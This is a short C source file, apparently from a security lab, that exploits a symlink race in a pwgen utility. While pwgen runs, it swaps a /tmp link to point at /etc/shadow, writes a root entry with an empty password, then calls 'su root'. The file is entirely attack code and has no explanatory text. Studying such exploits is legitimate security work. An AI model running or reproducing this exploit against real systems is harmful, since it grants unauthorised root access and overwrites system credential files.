/*
* dummy exploit program
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define TARGET "/usr/local/bin/pwgen"


int main(int argc, char *argv[])
{
  FILE *fp,*tmpfile;
  int i;
  char changeshadow[] ="root::16565::::::";




  tmpfile = fopen("/tmp/fakefile","w");
  fclose(tmpfile);

  symlink("/tmp/fakefile","/tmp/pwgen_entropy");//link to my own fake file
  fp = popen("/usr/local/bin/pwgen -e","w");//open the pwgen in another process
  system("rm /tmp/pwgen_entropy -f");//rm old link file
  symlink("/etc/shadow","/tmp/pwgen_entropy"); //link to shadow file
  fprintf(fp, "\n%s", changeshadow);
  fclose(fp);
  system("su root");
  exit(0);
}
